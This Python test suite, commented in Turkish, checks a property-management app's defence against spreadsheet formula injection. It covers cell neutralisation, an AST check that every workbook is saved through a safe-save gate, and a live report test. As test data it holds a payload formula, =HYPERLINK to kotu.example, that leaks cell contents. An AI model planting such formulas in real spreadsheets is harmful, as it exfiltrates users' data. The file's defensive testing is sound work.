"""(P248 §3c) HESAP TABLOSU FORMUL ENJEKSIYONU.

Uc katman:
  1. BIRIM — `hucre_guvenligi`: tehlikeli onekli metin DUZ METIN olur,
     metin DEGISMEZ, sayilar dokunulmaz.
  2. KILIT — uygulamada `Workbook.save` yalniz `guvenli_kaydet` icinden
     cagrilir (yeni bir disa aktarim kapiyi atlayamaz).
  3. CANLI — gercek rapor ucu: sakin adi `=HYPERLINK(...)` olan bir tesisin
     `site_sakinleri` Excel'i indirilir; hucre formul DEGIL metin.
"""
from __future__ import annotations

import ast
import io
from pathlib import Path

import pytest
from openpyxl import Workbook, load_workbook

from app.hucre_guvenligi import (
    TEHLIKELI_ONEKLER,
    csv_hucresi,
    guvenli_kaydet,
    tehlikeli_mi,
)

APP = Path(__file__).resolve().parents[1] / "app"
SALDIRI = '=HYPERLINK("http://kotu.example/?"&A1,"Tikla")'


# ================================ BIRIM ===================================== #
@pytest.mark.parametrize("onek", TEHLIKELI_ONEKLER)
def test_tehlikeli_onekler(onek):
    assert tehlikeli_mi(onek + "1+1")
    assert csv_hucresi(onek + "x") == "'" + onek + "x"


def test_masum_metin_ve_sayilar_dokunulmaz():
    assert not tehlikeli_mi("Ali = Veli")      # ortada `=` masum
    assert not tehlikeli_mi(-150.25)            # SAYI, metin degil
    assert csv_hucresi("A Blok") == "A Blok"
    assert csv_hucresi(None) == ""


def test_xlsx_FORMUL_DEGIL_METIN_ve_metin_AYNEN():
    wb = Workbook()
    ws = wb.active
    ws.append([SALDIRI, "+90 532", "@SUM(A1)", "-2+3", "normal", -150.25])
    # openpyxl `=` ile baslayan dizeyi FORMUL sayar — kusurun kaniti:
    assert ws["A1"].data_type == "f"
    geri = load_workbook(io.BytesIO(guvenli_kaydet(wb)))
    ws2 = geri.active
    for hucre in ws2[1][:5]:
        assert hucre.data_type == "s", (hucre.coordinate, hucre.data_type)
    assert ws2["A1"].value == SALDIRI           # kesme isareti EKLENMEDI
    assert ws2["A1"].quotePrefix is True
    assert ws2["F1"].value == -150.25 and ws2["F1"].data_type == "n"


def test_vardiya_disa_aktarim_DONGUSU_bozulmaz():
    """Disa aktarilan plan GERI YUKLENEBILMELI — `'` metne eklenseydi not
    her donguda bir kesme isareti daha kazanirdi."""
    from app.vardiya_excel import KOLON_KODLARI, plan_disa_aktar

    satir = {k: "" for k in KOLON_KODLARI}
    satir["not"] = "=1+1 degil, not"
    wb = load_workbook(io.BytesIO(plan_disa_aktar([satir], "Site")))
    ws = wb.active
    sutun = KOLON_KODLARI.index("not") + 1
    hucre = ws.cell(row=2, column=sutun)
    assert hucre.value == "=1+1 degil, not" and hucre.data_type == "s"


# ================================ KILIT ===================================== #
def test_KILIT_workbook_save_yalniz_guvenli_kaydet_icinden():
    ihlal = []
    for yol in APP.rglob("*.py"):
        if yol.name == "hucre_guvenligi.py":
            continue
        kaynak = yol.read_text(encoding="utf-8")
        if "openpyxl" not in kaynak:
            continue
        for d in ast.walk(ast.parse(kaynak)):
            if isinstance(d, ast.Call) and isinstance(d.func, ast.Attribute) \
                    and d.func.attr == "save" and isinstance(d.func.value, ast.Name) \
                    and d.func.value.id in ("wb", "kitap", "workbook"):
                ihlal.append(f"{yol.relative_to(APP)}:{d.lineno}")
    assert not ihlal, (
        "openpyxl calisma kitabi guvenli_kaydet() disinda kaydediliyor — "
        f"formul enjeksiyonu kapisi atlanir: {ihlal}")


def test_KILIT_openpyxl_kullanan_her_modul_kapiyi_import_eder():
    eksik = [
        str(y.relative_to(APP)) for y in APP.rglob("*.py")
        if "from openpyxl import Workbook" in y.read_text(encoding="utf-8")
        and "guvenli_kaydet" not in y.read_text(encoding="utf-8")
    ]
    assert not eksik, f"Workbook ureten ama guvenli_kaydet kullanmayan: {eksik}"


# ================================ CANLI ===================================== #
def _headers(client, slug, cred):
    r = client.post("/auth/login", json={
        "tenant_slug": slug, "email": cred["email"], "password": cred["password"]})
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def test_CANLI_rapor_excelinde_formul_calismaz(client, world, owner_conn):
    with owner_conn.cursor() as cur:
        cur.execute(
            "UPDATE app_user SET ad = %s WHERE tenant_id = %s AND role = 'resident' "
            "RETURNING id",
            (SALDIRI, world["a"]),
        )
        uid = cur.fetchone()[0]
        cur.execute(
            "INSERT INTO unit (tenant_id, no) VALUES (%s, %s) RETURNING id",
            (world["a"], "F-1"),
        )
        unit_id = cur.fetchone()[0]
        cur.execute(
            "INSERT INTO unit_resident (tenant_id, unit_id, user_id) VALUES (%s,%s,%s)",
            (world["a"], unit_id, uid),
        )
    adm = _headers(client, world["slug_a"], world["admin_a"])
    r = client.post("/raporlar/site_sakinleri?bicim=excel", headers=adm, json={})
    assert r.status_code == 200, r.text
    wb = load_workbook(io.BytesIO(r.content))
    bulunan = [
        h for ws in wb.worksheets for satir in ws.iter_rows() for h in satir
        if isinstance(h.value, str) and "HYPERLINK" in h.value
    ]
    assert bulunan, "sakin adi rapora gelmedi — test kurulumu bozuk"
    for h in bulunan:
        assert h.data_type == "s", f"{h.coordinate} FORMUL olarak yazilmis"
        assert h.value == SALDIRI
